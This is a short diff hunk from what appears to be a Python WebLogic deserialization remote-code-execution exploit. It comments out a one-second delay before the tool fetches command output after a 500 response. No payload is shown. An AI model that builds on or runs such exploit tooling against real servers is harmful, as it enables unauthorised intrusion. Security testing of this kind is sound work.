@@ -91,7 +91,7 @@ def weblogic_rce(target,cmd,output_file):
         #500时说明已成功反序列化执行命令
         if r.status_code == 500:
             #delay一下，保证命令执行完整性：
-            time.sleep(1)
+            #time.sleep(1)
             return get_output(target,output_file)
         elif r.status_code == 404:
             return (False,'404 no vulnerability')
